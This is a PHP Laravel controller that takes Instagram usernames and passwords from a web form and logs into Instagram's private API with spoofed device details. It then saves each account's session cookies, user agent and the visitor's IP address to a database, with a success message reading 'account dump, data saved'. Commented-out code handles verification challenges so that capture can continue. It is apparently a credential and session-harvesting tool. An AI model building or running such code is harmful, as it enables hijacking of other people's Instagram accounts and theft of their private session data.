<?php

namespace App\Http\Controllers;
use App\Http\Controllers\igfuncController;
use  App\Http\Controllers\funcControler;

use Illuminate\Http\Request;
class InstagramLoginController extends Controller
{
    public function login(Request $request)
    {
        // require('lib/config.php');
        // echo "[?] Input your instagram username : ";
        $userig    = $request->input('instagram_username');
        // echo "[?] Input your instagram password : ";
        $passig    = $request->input('instagram_password');

        $userIP = $request->ip();
        //
        $useragent = igfuncController::generate_useragent();
        $device_id = igfuncController::generate_device_id();
        $user      = $userig;
        $pass      = $passig;
        $login     = igfuncController::proccess(1, $useragent, 'accounts/login/', 0, igfuncController::hook('{"device_id":"' . $device_id . '","guid":"' . igfuncController::generate_guid() . '","username":"' . $userig . '","password":"' . $passig . '","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array(
            'Accept-Language: id-ID, en-US',
            'X-IG-Connection-Type: WIFI'
        ));
        $ext		= json_decode($login[1]);
        preg_match('#set-cookie: csrftoken=([^;]+)#i', str_replace('Set-Cookie:', 'set-cookie:', $login[0]), $token);
        preg_match_all('%set-cookie: (.*?);%', str_replace('Set-Cookie:', 'set-cookie:', $login[0]), $d);
        $cookie 	= '';
        for($o = 0; $o < count($d[0]); $o++){
            $cookie .= $d[1][$o] . ";";
        }
        if($ext->status == 'ok'){
            $uname       = $ext->logged_in_user->username;
            $uid         = $ext->logged_in_user->pk;

            \App\Models\Cookie::create([
                'username'   => $uname,
                'pk'         => $uid,
                'cookie_data' => $cookie,
                'useragent'  => $useragent,
                'user_ip'    => $userIP,
            ]);  
            // saveCookie('./data/'.$cookieFile_dump, $cookie."|".$useragent);
            session()->flash('success', 'Login berhasil. AKUN DUMP, Data tersimpan.');

            return redirect()->route('instagram.login');
        // } elseif($ext->error_type == 'checkpoint_challenge_required'){
        //     $_SESSION['c_cookie']       = $cookie;
        //     $_SESSION['c_ua']           = $useragent;
        //     $_SESSION['c_token']        = $token[1];
        //     $_SESSION['c_url']          = $ext->challenge->url;
        //     $_SESSION['c_username']     = $user;
        //     $_SESSION['c_password']     = $pass;
        //     echo "[!] Verification required\n";
        //     echo "[!] ==============================\n\n";
        //     sleep(2);
        //     echo "[1] Phone number\n[2] Email\n[?] Enter number verification method : ";
        //     $verifikasi				    = trim(fgets(STDIN, 1024));
        //     if($verifikasi == 1){
        //         $verifikasi = 0;
        //     } elseif($verifikasi == 2){
        //         $verifikasi = 1;
        //     } else {
        //         echo "[+] Invalid input\n";
        //         echo "[+] Exit...\n";
        //         exit();
        //     }
        //     $challenge_csrf     		= $_SESSION['c_token'];
        //     $challenge_url      		= $_SESSION['c_url'];
        //     $challenge_ua       		= $_SESSION['c_ua'];
        //     $challenge_cookie   		= $_SESSION['c_cookie'];
        //     $challenge_pw       		= $_SESSION['c_password'];
        //     $data               		= 'choice='.$verifikasi;
        //     $cekpoint           		= cekpoint($challenge_url, $data, $challenge_csrf, $challenge_cookie, $challenge_ua);
        //     if(strpos($cekpoint, 'status": "ok"') !== false){
        //         echo "[+] Verification code has been sent\n";
        //         echo "[+] ==============================\n\n";
        //         sleep(2);
        //         echo "[?] Enter verification code : ";
        //         $kode   			= trim(fgets(STDIN, 1024));
        //         $data               = 'security_code='.$kode;
        //         $cekpoint           = cekpoint($challenge_url, $data, $challenge_csrf, $challenge_cookie, $challenge_ua);
        //         if(strpos($cekpoint, 'status": "ok"') !== false){
        //             preg_match_all('%set-cookie: (.*?);%', str_replace('Set-Cookie:', 'set-cookie:', $cekpoint), $d);
        //             $cookie     = '';
        //             for($o = 0; $o < count($d[0]); $o++){
        //                 $cookie .= $d[1][$o] . ";";
        //             }
        //             $req        = proccess(1, $challenge_ua, 'accounts/current_user/', $cookie);
        //             $reqx       = json_decode($req[1]);
        //             if($reqx->status == 'ok'){
        //                 $cookie                 = $cookie;
        //                 $useragent              = $challenge_ua;
        //                 saveCookie('./data/'.$cookieFile_dump, $cookie."|".$useragent);
        //                 echo "[+] Login success....\n";
        //                 echo "[+] Data saved\n";
        //             } else {
        //                 echo "[!] Cookie die\n";
        //                 echo "[!] Exit...\n";
        //             }
        //         }
        //     } else {
        //         echo "[!] Failed sent verification code ".$cekpoint." - ".var_dump($_SESSION)."\n";
        //         echo "[!] Exit...\n";
        //         exit();
        //     }
        } elseif($ext->error_type == 'bad_password'){
            session()->flash('error', 'Password yang Anda masukkan salah. Silakan coba lagi.');
            return redirect()->route('instagram.login');
        }
       else {
            session()->flash('error', 'Terjadi kesalahan yang tidak diketahui: ' . $ext->message);
            return redirect()->route('instagram.login');
       }
    }
}
